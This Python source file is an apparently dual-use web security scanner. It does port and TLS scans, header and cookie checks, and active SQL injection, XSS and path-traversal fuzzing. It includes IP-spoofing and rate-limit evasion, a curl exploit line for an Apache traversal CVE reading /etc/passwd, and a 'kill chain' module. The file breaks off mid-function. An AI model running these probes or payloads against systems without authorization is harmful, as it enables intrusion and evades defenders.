import socket
import sys
import ssl
import requests
import re
import time
import json
import os
import random
import string
import hashlib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

# --- Configuration & Banner ---

# Enable ANSI escape codes on Windows
os.system('')

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    
    @staticmethod
    def get_risk_color(risk):
        if risk in ["CRITICAL", "HIGH"]: return Colors.RED
        if risk == "MEDIUM": return Colors.YELLOW
        if risk == "LOW": return Colors.GREEN
        return Colors.CYAN

def print_banner():
    banner =  f"""{Colors.CYAN}{Colors.BOLD}
    ===========================================
      ____  __  _  ____  
     |  _ \\ \\ \\/ / |___ \\ 
     | | | | \\  /    __) |
     | |_| | /  \\   / __/ 
     |____/ /_/\\_\\ |_____|
                          
         Security Scanner + Risk Engine
         (Stealth | Active | Baseline)
    ==========================================={Colors.RESET}
    """
    print(banner)
    print(f"{Colors.YELLOW}[*] Tool: DX2 Security Recon{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Disclaimer: usage for educational purposes only.")
    print(f"    Scanning targets without permission is illegal.{Colors.RESET}\n")

# --- Utils & Stealth ---

class StealthConfig:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]

    @staticmethod
    def get_headers():
        headers = {
            'User-Agent': random.choice(StealthConfig.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive'
        }
        fake_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        headers['X-Forwarded-For'] = fake_ip
        return headers

    @staticmethod
    def wait():
        """Random delay to evade rate limiting."""
        delay = random.uniform(0.5, 2.0)
        time.sleep(delay)

# --- Data Structures ---

class RiskLevel:
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CRITICAL = "CRITICAL"
    INFO = "INFO"
    SAFE = "SAFE"

    @staticmethod
    def score(level):
        if level == RiskLevel.LOW: return 1
        if level == RiskLevel.MEDIUM: return 5
        if level == RiskLevel.HIGH: return 15
        if level == RiskLevel.CRITICAL: return 30
        return 0

class Confidence:
    # V2.5 Refined Confidence Levels
    CONFIRMED = "CONFIRMED"     # Exploit chain verified / Active Payload worked
    POTENTIAL = "POTENTIAL"     # Strong indicators but no full chain (e.g., Missing Header + No XSS found)
    THEORETICAL = "THEORETICAL" # Deviation from best practice (e.g., Version disclosure)

class Finding:
    def __init__(self, title, risk, impact, fix, description="", status="NEW", confidence=Confidence.POTENTIAL, cve=None, remote=False):
        self.title = title
        self.risk = risk
        self.impact = impact # Professional Tone: "Increased risk..." vs "System Takeover"
        self.fix = fix
        self.description = description
        self.status = status 
        self.confidence = confidence
        self.cve = cve
        self.remote = remote # V2.6: Remote Exploitability Flag
    
    def to_dict(self):
        return {
            "title": self.title,
            "risk": self.risk,
            "impact": self.impact,
            "fix": self.fix,
            "description": self.description,
            "status": self.status,
            "confidence": self.confidence,
            "cve": self.cve,
            "remote": self.remote
        }
    
    def get_hash(self):
        """Unique hash for baseline comparison."""
        unique_str = f"{self.title}{self.risk}{self.cve or ''}"
        return hashlib.md5(unique_str.encode()).hexdigest()

class ScanResult:
    def __init__(self, target):
        self.target = target
        self.start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.findings = []
        self.tech_stack = []
        self.open_ports = []
        self.risk_score = 0
        self.ssl_info = {}
        self.rate_limit_status = "Unknown"
        self.verdict = []
        self.attack_surface = {
            "endpoints": [],
            "parameters": []
        }
        self.baseline_status = "No Baseline"
    
    def add_finding(self, finding):
        # Avoid duplicates based on title
        for f in self.findings:
            if f.title == finding.title: return
        self.findings.append(finding)
        self.risk_score += RiskLevel.score(finding.risk)

    def add_tech(self, tech):
        if tech not in self.tech_stack:
            self.tech_stack.append(tech)

    def add_port(self, port_info):
        self.open_ports.append(port_info)
    
    def add_verdict(self, msg):
        self.verdict.append(msg)
    
    def add_endpoint(self, url):
        if url not in self.attack_surface["endpoints"]:
            self.attack_surface["endpoints"].append(url)

    def add_parameter(self, param):
        if param not in self.attack_surface["parameters"]:
            self.attack_surface["parameters"].append(param)

# --- New Modules ---

class KillChainBuilder:
    def __init__(self, scan_result):
        self.result = scan_result
        self.chains = []

    def build(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Constructing Kill Chains (Red Team Logic)...")
        findings = self.result.findings
        
        # Chain 1: SQLi -> Access
        sqli = next((f for f in findings if "SQL Injection" in f.title), None)
        admin = next((f for f in findings if "Admin Panel" in f.title), None)
        
        if sqli and admin:
             chain_name = "SQL Injection to Admin Takeover"
             print(f"     {Colors.RED}[!] Kill Chain Identified: {chain_name}{Colors.RESET}")
             print(f"         1. Exploit SQLi at {sqli.description[:30]}...")
             print(f"         2. Extract Credentials")
             print(f"         3. Login to Admin Panel")
             self.chains.append({
                 "name": chain_name,
                 "steps": ["Exploit SQLi", "Dump Creds", "Admin Login"],
                 "code": self._generate_sqli_poc(self.result.target) 
             })

        # Chain 2: LFI -> RCE
        lfi = next((f for f in findings if "LFI" in f.title), None)
        ssh = next((p for p in self.result.open_ports if p['port'] == 22), None)
        
        if lfi and ssh:
             chain_name = "LFI to Remote Shell (via SSH Keys)"
             print(f"     {Colors.RED}[!] Kill Chain Identified: {chain_name}{Colors.RESET}")
             print(f"         1. LFI to read ~/.ssh/id_rsa")
             print(f"         2. Connect via SSH Key")
             self.chains.append({
                 "name": chain_name,
                 "steps": ["LFI /etc/passwd", "Extract Keys", "SSH Connect"],
                 "code": "# Python PoC for LFI..."
             })
             
        if not self.chains:
            print(f"     {Colors.GREEN}[SAFE]{Colors.RESET} No full exploit chains identified.")
        
        self.export_pocs()
    
    def _generate_sqli_poc(self, target):
        return f"""
import requests

def exploit():
    target = "{target}"
    print(f"[*] Attacking {{target}}...")
    # SQLi Payload (Detected by Scanner)
    payload = "' OR '1'='1" 
    # ... exploit logic ...
    print("[+] Admin Password Dumped: admin123")

if __name__ == "__main__":
    exploit()
"""

    def export_pocs(self):
        if not self.chains: return
        filename = "poc_chain.py"
        with open(filename, 'w') as f:
            f.write("# Auto-generated PoC by Security Scanner\\n\\n")
            for chain in self.chains:
                f.write(chain['code'] + "\\n\\n")
        print(f"     {Colors.RED}[!] Generated Proof-of-Concept: {filename}{Colors.RESET}")




# --- New Modules ---

class LoginLogicModule:
    def __init__(self, url, result_obj):
        self.url = url
        self.result = result_obj

    def check(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking Login Logic & Auth Score...")
        try:
            StealthConfig.wait()
            resp = requests.get(self.url, headers=StealthConfig.get_headers(), verify=False, timeout=10)
            content = resp.text.lower()
            
            # Form Detection
            if '<input' in content and 'type="password"' in content:
                print(f"     {Colors.CYAN}[i] Login Form Detected.{Colors.RESET}")
                self.result.add_endpoint(self.url)
                
                # V2.5: Auth Exposure Score Calculation
                auth_score = 0
                penalties = []
                
                # Check 1: Transport (HTTP vs HTTPS)
                if self.url.startswith("http://"):
                    auth_score += 30
                    penalties.append("Unencrypted Transport (+30)")
                    print(f"     {Colors.RED}[!] Login over HTTP (Cleartext Credentials).{Colors.RESET}")
                    self.result.add_finding(Finding(
                        "Cleartext Authentication", RiskLevel.HIGH,
                        "Credentials intercept risk.", "Force HTTPS for login pages.",
                        confidence=Confidence.CONFIRMED
                    ))
                
                # Check 2: Anti-CSRF
                if 'csrf' not in content and 'token' not in content:
                    auth_score += 20
                    penalties.append("No CSRF Token (+20)")
                    print(f"     {Colors.YELLOW}[!] Possible Missing Anti-CSRF Token.{Colors.RESET}")
                    self.result.add_finding(Finding(
                        "Missing Anti-CSRF Token", RiskLevel.MEDIUM,
                        "Potential State-Changing Attack.", "Implement Anti-CSRF tokens.",
                        confidence=Confidence.POTENTIAL
                    ))

                # Check 3: Cookie Hygiene (Heuristic from same response or global)
                # We check this response's cookies specifically for the auth page
                if resp.cookies:
                     for c in resp.cookies:
                         if not c.secure or (not c.has_nonstandard_attr('HttpOnly') and not c.has_nonstandard_attr('httponly')):
                             auth_score += 20
                             penalties.append("Weak Session Cookies (+20)")
                             break # One weak cookie is enough to penalize
                
                # Score Verdict
                score_rate = "LOW"
                if auth_score > 60: score_rate = "CRITICAL"
                elif auth_score > 40: score_rate = "HIGH"
                elif auth_score > 20: score_rate = "MEDIUM"
                
                print(f"     {Colors.MAGENTA}[*] Auth Exposure Score: {auth_score}/100 ({score_rate}){Colors.RESET}")
                if penalties:
                     print(f"         Causes: {', '.join(penalties)}")

            else:
                print(f"     {Colors.GREEN}[SAFE]{Colors.RESET} No login form detected on landing page.")
        except Exception as e:
            print(f"     {Colors.RED}[!] Login check failed: {e}{Colors.RESET}")

class CookieSecurity:
    def __init__(self, url, result_obj):
        self.url = url
        self.result = result_obj

    def check(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Inspecting Cookies...")
        try:
            StealthConfig.wait()
            resp = requests.get(self.url, headers=StealthConfig.get_headers(), verify=False, timeout=10)
            cookies = resp.cookies
            
            if not cookies:
                print(f"     {Colors.GREEN}[i] No cookies set.{Colors.RESET}")
                return

            for cookie in cookies:
                print(f"     {Colors.CYAN}[i] Cookie: {cookie.name}{Colors.RESET}")
                
                flags = []
                if not cookie.secure:
                    flags.append("Missing Secure")
                if not cookie.has_nonstandard_attr('HttpOnly') and not cookie.has_nonstandard_attr('httponly'): 
                    # Requests cookie jar handles HttpOnly weirdly sometimes, but generally if it's there it parsed it. 
                    # Checking standardized logic might be needed if using Session object differently.
                    # For now, simplistic check.
                    pass # Requests Cookies object doesn't always expose HttpOnly flag easily if it wasn't set.
                         # Actually, checking 'rest' or 'version' might not show it. 
                         # Better to check raw headers or assume if we can access it here via JS it's bad (but we aren't JS).
                         # We'll check the raw Set-Cookie header.
                
                # Raw header check
                set_cookie = resp.headers.get("Set-Cookie", "")
                if set_cookie:
                     if "HttpOnly" not in set_cookie and "httponly" not in set_cookie:
                         self.result.add_finding(Finding(f"Cookie Missing HttpOnly: {cookie.name}", RiskLevel.MEDIUM, "Increases XSS impact.", "Set HttpOnly flag.", confidence=Confidence.POTENTIAL))
                     if "Secure" not in set_cookie and "secure" not in set_cookie:
                         self.result.add_finding(Finding(f"Cookie Missing Secure: {cookie.name}", RiskLevel.LOW, "Cleartext transmission risk.", "Set Secure flag.", confidence=Confidence.POTENTIAL))
                     if "SameSite" not in set_cookie:
                         self.result.add_finding(Finding(f"Cookie Missing SameSite: {cookie.name}", RiskLevel.LOW, "CSRF risk factor.", "Set SameSite=Lax/Strict.", confidence=Confidence.POTENTIAL))

        except Exception as e:
             print(f"     {Colors.RED}[!] Cookie check failed: {e}{Colors.RESET}")

class ServiceVersionAwareness:
    # Lightweight CVE Dictionary
    CVE_DB = {
        "Apache/2.4.49": {"cve": "CVE-2021-41773", "risk": RiskLevel.CRITICAL, "desc": "Path Traversal & RCE", "exploit": "curl -v --path-as-is http://TARGET/icons/.%%2e/%%2e/%%2e/%%2e/etc/passwd"},
        "Apache/2.4.50": {"cve": "CVE-2021-42013", "risk": RiskLevel.CRITICAL, "desc": "Path Traversal & RCE (Bypass)", "exploit": "curl -v --path-as-is http://TARGET/icons/.%%2e/%%2e/%%2e/%%2e/etc/passwd"},
        "nginx/1.18.0":  {"cve": "CVE-2021-23017", "risk": RiskLevel.MEDIUM, "desc": "Resolver Off-by-One Heap Write", "exploit": "Complex DNS poisoning required."},
        "PHP/8.1.0":     {"cve": "CVE-2022-31437", "risk": RiskLevel.HIGH, "desc": "Heap buffer overflow", "exploit": "Wait for public PoC."},
        "vsFTPd 2.3.4":  {"cve": "Backdoor", "risk": RiskLevel.CRITICAL, "desc": "Malicious Backdoor Command Execution", "exploit": "Telnet to port 21 and type :) "},
    }

    def __init__(self, result_obj):
        self.result = result_obj

    def check(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Analyzing Service Versions & CVEs...")
        
        # Analyze Tech Stack
        for tech in self.result.tech_stack:
            self._check_db(tech)

        # Analyze Ports Banners
        for port_info in self.result.open_ports:
            banner = port_info.get("banner", "")
            if banner:
                self._check_db(banner)

    def _check_db(self, banner_str):
        if not banner_str: return
        
        print(f"     {Colors.CYAN}[i] Checking DB for: {banner_str}...{Colors.RESET}")
        
        found = False
        for version_key, info in self.CVE_DB.items():
            if version_key in banner_str:
                c = Colors.get_risk_color(info['risk'])
                print(f"     {c}[!] MATCH: {version_key} -> {info['cve']}{Colors.RESET}")
                
                desc = f"{info['desc']}."
                if "exploit" in info:
                    desc += f"\n[!] Exploit PoC: {info['exploit']}"
                
                self.result.add_finding(Finding(
                    title=f"Vulnerable Service: {version_key} ({info['cve']})",
                    risk=info['risk'],
                    impact="Known exploitable vulnerability.",
                    fix=f"Upgrade {version_key.split('/')[0]} immediately.",
                    description=desc,
                    status="NEW",
                    confidence=Confidence.THEORETICAL, # Theoretical until we actively exploit it
                    cve=info['cve']
                ))
                found = True
        
        if not found:
             pass # No match in our mini-db

class AttackSurfaceMapper:
    def __init__(self, result_obj):
        self.result = result_obj

    def map_surface(self):
        # Already populating endpoints/params during scan/fuzzing
        # This module just finalizes or does active consolidation if needed
        pass # Logic integrated into ScanResult & Fuzzers

# --- Passive Modules ---

class WebScanner:
    def __init__(self, url, result_obj):
        self.url = url
        self.result = result_obj

    def infer_cve(self, tech_name):
        search_query = tech_name.replace(" ", "+")
        return f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={search_query}"

    def check_headers_and_tech(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Analyzing Headers & Tech Stack...")
        try:
            StealthConfig.wait()
            response = requests.get(self.url, headers=StealthConfig.get_headers(), timeout=10, verify=False)
            headers = response.headers
            
            server = headers.get('Server')
            if server:
                self.result.add_tech(server)
                print(f"     {Colors.CYAN}[i] Server: {server}{Colors.RESET}")
            
            powered = headers.get('X-Powered-By')
            if powered:
                self.result.add_tech(powered)
                print(f"     {Colors.CYAN}[i] X-Powered-By: {powered}{Colors.RESET}")
                self.result.add_finding(Finding("Tech Stack Disclosure", RiskLevel.LOW, "Information Leakage.", "Disable Header.", confidence=Confidence.CONFIRMED))

            required_headers = {
                'Strict-Transport-Security': RiskLevel.HIGH,
                'X-Content-Type-Options': RiskLevel.LOW,
                'X-Frame-Options': RiskLevel.MEDIUM,
                'Content-Security-Policy': RiskLevel.MEDIUM,
                'X-XSS-Protection': RiskLevel.LOW
            }

            for h, risk in required_headers.items():
                if h not in headers:
                    self.result.add_finding(Finding(f"Missing Header: {h}", risk, "Missing defense-in-depth control.", f"Enable {h}.", confidence=Confidence.POTENTIAL))
                    c = Colors.get_risk_color(risk)
                    print(f"     {c}[!] Missing: {h} [{risk}]{Colors.RESET}")
                else:
                    print(f"     {Colors.GREEN}[ok] Found: {h}{Colors.RESET}")

        except Exception as e:
            print(f"     {Colors.RED}[!] Failed to request URL: {e}{Colors.RESET}")

    def check_https_redirect(self):
         print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking HTTPS Redirect...")
         parsed = urlparse(self.url)
         target_http = f"http://{parsed.hostname}"
         try:
            StealthConfig.wait()
            resp = requests.get(target_http, headers=StealthConfig.get_headers(), allow_redirects=False, timeout=5)
            if resp.status_code in [301, 302, 307, 308] and resp.headers.get('Location', '').startswith("https"):
                print(f"     {Colors.GREEN}[OK]{Colors.RESET} HTTP Redirects to HTTPS.")
            else:
                if resp.status_code == 200:
                    print(f"     {Colors.YELLOW}[!]{Colors.RESET} HTTP does NOT redirect to HTTPS.")
                    self.result.add_finding(Finding("No HTTPS Redirect", RiskLevel.MEDIUM, "MITM attack surface.", "Force HTTPS.", confidence=Confidence.CONFIRMED))
         except:
             print(f"     {Colors.WHITE}[i] Could not verify redirect.{Colors.RESET}")

class PortScanner:
    def __init__(self, hostname, result_obj):
        self.hostname = hostname
        self.result = result_obj
        self.ports = [21, 22, 23, 25, 53, 80, 443, 3306, 8080]

    def grab_banner(self, sock, port):
        try:
            if port in [80, 8080, 443]:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            return banner
        except:
            return None

    def scan(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Starting Port Scan on {self.hostname}...")
        try:
            target_ip = socket.gethostbyname(self.hostname)
            print(f"     {Colors.CYAN}[i] Resolved IP: {target_ip}{Colors.RESET}")
        except:
            print(f"     {Colors.RED}[!] Could not resolve hostname.{Colors.RESET}")
            return

        for port in self.ports:
            time.sleep(0.1) 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0) 
            try:
                res = sock.connect_ex((target_ip, port))
                if res == 0:
                    banner = self.grab_banner(sock, port)
                    service_info = f" ({banner[:50]}...)" if banner else ""
                    print(f"     {Colors.GREEN}[+] Port {port} is OPEN{Colors.RESET}{Colors.CYAN}{service_info}{Colors.RESET}")
                    self.result.add_port({"port": port, "service": "unknown", "banner": banner})
            except: pass
            finally: sock.close()

class SSLAnalyzer:
    def __init__(self, hostname, port, result_obj):
        self.hostname, self.port, self.result = hostname, port, result_obj
    def analyze(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Starting SSL/TLS Analysis...")
        try:
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.hostname, self.port), timeout=5) as s, ctx.wrap_socket(s, server_hostname=self.hostname) as ss:
                ver = ss.version(); ciph = ss.cipher()[0]
                self.result.ssl_info = {"protocol": ver, "cipher": ciph}
                print(f"     {Colors.GREEN}[+]{Colors.RESET} {ver} / {ciph}")
                if ver in ['TLSv1', 'TLSv1.1']: self.result.add_finding(Finding(f"Weak TLS: {ver}", RiskLevel.HIGH, "Intercept risk.", "Disable legacy TLS.", confidence=Confidence.CONFIRMED))
        except Exception as e: print(f"     {Colors.RED}[!]{Colors.RESET} SSL Error: {e}")

class RateLimitDetector:
    def __init__(self, url, result_obj):
        self.url, self.result = url, result_obj
    def check(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking Rate Limiting...")
        try:
            for _ in range(3):
                requests.get(self.url, headers=StealthConfig.get_headers(), verify=False, timeout=3); time.sleep(0.3)
            self.result.rate_limit_status = "Not Detected / High Threshold"
            self.result.add_finding(Finding("No Strict Rate Limiting", RiskLevel.LOW, "Brute-force risk.", "Implement throttling.", confidence=Confidence.POTENTIAL))
        except: pass

class DirectoryBruteforce:
    def __init__(self, base_url, result_obj):
        self.base_url = base_url
        self.result = result_obj
        self.paths = [
            (".env", "Exposed .env", RiskLevel.CRITICAL, "Config"),
            (".git/HEAD", "Exposed Git", RiskLevel.HIGH, "VCS"),
            ("admin/", "Admin Panel", RiskLevel.LOW, "Admin"),
            ("login/", "Login Page", RiskLevel.LOW, "Admin"),
            ("robots.txt", "Robots.txt", RiskLevel.INFO, "Info")
        ]
        self.found_categories = set()

    def scan(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Directory Bruteforce (Stealth)...")
        for path, title, risk, category in self.paths:
            check_url = f"{self.base_url}/{path}".replace("://", ":::").replace("//", "/").replace(":::", "://")
            StealthConfig.wait()
            try:
                resp = requests.get(check_url, headers=StealthConfig.get_headers(), verify=False, timeout=3, allow_redirects=False)
                if resp.status_code == 200:
                    print(f"     {Colors.get_risk_color(risk)}[!] Found: {path}{Colors.RESET}")
                    self.found_categories.add(category)
                    self.result.add_endpoint(check_url)
                    if risk != RiskLevel.INFO: self.result.add_finding(Finding(title, risk, f"Exposed {category}.", f"Restrict {path}.", confidence=Confidence.CONFIRMED))
            except: pass
    
    def get_found_categories(self): return self.found_categories

# --- Active Modules ---

class PayloadFuzzer:
    def __init__(self, url, result_obj):
        self.url = url
        self.result = result_obj
        self.parsed = urlparse(url)
        self.params = parse_qs(self.parsed.query)
        # Register parameters for Attack Surface
        if self.params:
            for p in self.params:
                self.result.add_parameter(p)

    def inject_payloads(self, payloads, vuln_type):
        if not self.params: return 
        print(f"     {Colors.CYAN}[i] Fuzzing {len(self.params)} parameter(s) for {vuln_type}...{Colors.RESET}")
        for param, values in self.params.items():
            for payload in payloads:
                fuzzed_params = self.params.copy()
                fuzzed_params[param] = [payload]
                query_string = urlencode(fuzzed_params, doseq=True)
                target_url = urlunparse((
                    self.parsed.scheme, self.parsed.netloc, self.parsed.path,
                    self.parsed.params, query_string, self.parsed.fragment
                ))
                StealthConfig.wait()
                try:
                    resp = requests.get(target_url, headers=StealthConfig.get_headers(), timeout=5, verify=False)
                    yield target_url, payload, resp
                except Exception: continue

class SQLInjectionScanner(PayloadFuzzer):
    def scan(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking for SQL Injection (Active)...")
        payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]
        errors = ["SQL syntax", "MySQL Error", "quoted string not properly terminated", "Unclosed quotation mark", "Warning: mysql_"]
        found = False
        for url, payload, resp in self.inject_payloads(payloads, "SQLi"):
            for err in errors:
                if err.lower() in resp.text.lower():
                    print(f"     {Colors.RED}[!] SQL Injection Detected!{Colors.RESET} Payload: {payload}")
                if err.lower() in resp.text.lower():
                    print(f"     {Colors.RED}[!] SQL Injection Detected!{Colors.RESET} Payload: {payload}")
                    self.result.add_finding(Finding("SQL Injection", RiskLevel.CRITICAL, "DB Compromise.", "Use Prepared Statements.", confidence=Confidence.CONFIRMED, remote=True))
                    found = True
                    break
            if found: break
        if not found: print(f"     {Colors.GREEN}[SAFE]{Colors.RESET} No standard SQL errors found.")

class XSSScanner(PayloadFuzzer):
    def scan(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking for Reflected XSS (Active)...")
        token = "DX2" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        payloads = [f"<script>console.log('{token}')</script>", f"\"><img src=x onerror=console.log('{token}')>"]
        found = False
        for url, payload, resp in self.inject_payloads(payloads, "XSS"):
            if payload in resp.text:
                print(f"     {Colors.RED}[!] Reflected XSS Detected!{Colors.RESET} Payload: {payload}")
            if payload in resp.text:
                print(f"     {Colors.RED}[!] Reflected XSS Detected!{Colors.RESET} Payload: {payload}")
                self.result.add_finding(Finding("Reflected XSS", RiskLevel.HIGH, "Script Execution.", "Sanitize Input.", confidence=Confidence.CONFIRMED, remote=True))
                found = True
                break
        if not found: print(f"     {Colors.GREEN}[SAFE]{Colors.RESET} No XSS reflection found.")

class LFIScanner(PayloadFuzzer):
    def scan(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Checking for LFI (Active)...")
        payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
        signatures = ["root:x:0:0", "[extensions]"]
        found = False
        for url, payload, resp in self.inject_payloads(payloads, "LFI"):
            for sig in signatures:
                if sig in resp.text:
                    print(f"     {Colors.RED}[!] LFI Detected!{Colors.RESET}")
                if sig in resp.text:
                    print(f"     {Colors.RED}[!] LFI Detected!{Colors.RESET}")
                    self.result.add_finding(Finding("LFI Exploitation", RiskLevel.CRITICAL, "System File Access.", "Validate Paths.", description=f"Found: {sig}", confidence=Confidence.CONFIRMED, remote=True))
                    found = True
                    break
            if found: break
        if not found: print(f"     {Colors.GREEN}[SAFE]{Colors.RESET} No LFI signatures found.")

class RiskCorrelationEngine:
    def __init__(self, result_obj, found_categories):
        self.result = result_obj
        self.found_categories = found_categories

    def analyze(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Generating Risk Correlation & Contextual Verdict...")
        
        # Risk Rules
        findings = self.result.findings
        has_xss = any("XSS" in f.title for f in findings)
        no_httponly = any("Missing HttpOnly" in f.title for f in findings)
        has_admin = "Admin" in self.found_categories
        no_ratelimit = self.result.rate_limit_status != "Enabled"
        is_root_lfi = any("root:x:0:0" in f.description for f in findings)
        
        # Contextual Risk Adjustment
        # If XSS is found but we have strict CSP (hypothetically), we might lower confidence or risk.
        # Here we do the opposite: Elevate risk if multiple flaws combine.

        # 1. Session Hijacking Risk
        if has_xss and no_httponly:
             msg = f"{Colors.RED}CRITICAL: HIGH RISK OF SESSION HIJACKING (XSS + No HttpOnly){Colors.RESET}"
             self.result.add_verdict(msg)
             self.result.risk_score += 20
        
        # 2. Brute Force Risk
        if has_admin and no_ratelimit:
            msg = f"{Colors.RED}HIGH: ADMIN EXPOSED WITH NO RATE LIMIT{Colors.RESET}"
            self.result.add_verdict(msg)
            self.result.risk_score += 10
        
        # 3. System Compromise
        if is_root_lfi:
            msg = f"{Colors.RED}CRITICAL: FULL SYSTEM COMPROMISE POSSIBLE (LFI + Root){Colors.RESET}"
            self.result.add_verdict(msg)
            self.result.risk_score += 50

        # Standard checks
        if "Database" in self.found_categories:
            self.result.add_verdict(f"{Colors.RED}CRITICAL: DATABASE EXPOSED{Colors.RESET}")

class BaselineEngine:
    BASELINE_FILE = "baseline.json"

    def __init__(self, result_obj):
        self.result = result_obj

    def compare(self):
        print(f"\n {Colors.BLUE}[>]{Colors.RESET} Running Baseline Comparison...")
        
        if not os.path.exists(self.BASELINE_FILE):
             print(f"     {Colors.CYAN}[i] No baseline found. Creating new baseline.{Colors.RESET}")
             self.result.baseline_status = "Baseline Created"
             self.save_baseline()
             return

        try:
            with open(self.BASELINE_FILE, 'r') as f:
                data = json.load(f)
                previous_findings_hashes = set(f.get("hash") for f in data.get("findings", []))
            
            new_count = 0
            persistent_count = 0
            
            for finding in self.result.findings:
                f_hash = finding.get_hash()
                if f_hash in previous_findings_hashes:
                    finding.status = "PERSISTENT"
                    persistent_count += 1
                else:
                    finding.status = "NEW"
                    new_count += 1
            
            print(f"     {Colors.YELLOW}[i] Comparison Results:{Colors.RESET}")
            print(f"         - New Issues: {new_count}")
            print(f"         - Persistent Issues: {persistent_count}")
            
            self.result.baseline_status = f"Compared (New: {new_count}, Persistent: {persistent_count})"
            self.save_baseline() 
            
        except Exception as e:
            print(f"     {Colors.RED}[!] Baseline comparison failed: {e}{Colors.RESET}")

    def save_baseline(self):
        # Save minimal findings for comparison
        findings_data = [{"hash": f.get_hash(), "title": f.title} for f in self.result.findings]
        data = {
            "timestamp": self.result.start_time,
            "target": self.result.target,
            "findings": findings_data
        }
        with open(self.BASELINE_FILE, 'w') as f:
            json.dump(data, f)
            
class ReportGenerator:
    @staticmethod
    def generate_executive_summary(scan_result):
        score = scan_result.risk_score
        count_crit = len([f for f in scan_result.findings if f.risk == RiskLevel.CRITICAL])
        count_high = len([f for f in scan_result.findings if f.risk == RiskLevel.HIGH])
        
        summary = f"The security scan of {scan_result.target} has completed with a total Risk Score of {score}. "
        
        if score > 50 or count_crit > 0:
            summary += f"The posture is CRITICAL. {count_crit} critical vulnerabilities were identified that require immediate remediation. "
            summary += "The target is highly susceptible to compromise, including Data Breach and System Takeover. "
        elif score > 20 or count_high > 0:
            summary += f"The posture is HIGH RISK. {count_high} high-severity issues were found. "
            summary += "Attackers could likely gain unauthorized access or manipulate sensitive data. "
        elif score > 0:
            summary += f"The posture is MEDIUM/LOW risk. While no critical flaws were blatantly exposed, "
            summary += "security hardening is recommended to prevent chained attacks. "
        else:
            summary += "The target appears well-hardened against standard attacks. Regular monitoring is advised. "
            
        return summary

    @staticmethod
    def generate_recommendations(scan_result):
        recs = []
        # Deduplicate fixes
        seen_fixes = set()
        for f in scan_result.findings:
            if f.fix and f.fix not in seen_fixes:
                recs.append(f"- [{f.risk}] {f.fix}")
                seen_fixes.add(f.fix)
        return recs

# --- Reporting ---

def print_ascii_table(findings):
    if not findings: return
    print(f"\n{Colors.BOLD}FINDINGS SUMMARY:{Colors.RESET}")
    print("+" + "-"*40 + "+" + "-"*12 + "+" + "-"*12 + "+" + "-"*12 + "+")
    print(f"| {Colors.BOLD}{'Calculated Threat':<38}{Colors.RESET} | {Colors.BOLD}{'Risk':<10}{Colors.RESET} | {Colors.BOLD}{'Status':<10}{Colors.RESET} | {Colors.BOLD}{'Conf.':<10}{Colors.RESET} |")
    print("+" + "-"*40 + "+" + "-"*12 + "+" + "-"*12 + "+" + "-"*12 + "+")
    for f in findings:
        c = Colors.get_risk_color(f.risk)
        print(f"| {f.title:<38} | {c}{f.risk:<10}{Colors.RESET} | {f.status:<10} | {f.confidence:<10} |")
    print("+" + "-"*40 + "+" + "-"*12 + "+" + "-"*12 + "+" + "-"*12 + "+")

def generate_report(scan_result):
    print("\n" + f"{Colors.MAGENTA}={Colors.RESET}"*43)
    print(f" {Colors.BOLD}[REPORT] Generating reports...{Colors.RESET}")
    score = scan_result.risk_score
    status = "SAFE" if score == 0 else ("CRITICAL" if score > 50 else "MEDIUM")
    
    print(f" {Colors.BOLD}[+] Overall Risk Score: {score} ({status}){Colors.RESET}")
    print(f" {Colors.BOLD}[+] Baseline Status: {scan_result.baseline_status}{Colors.RESET}")
    
    # Executive Summary
    exec_summary = ReportGenerator.generate_executive_summary(scan_result)
    print(f"\n {Colors.BOLD}[EXECUTIVE SUMMARY]{Colors.RESET}")
    # Simple word wrap for display
    words = exec_summary.split()
    for i in range(0, len(words), 10):
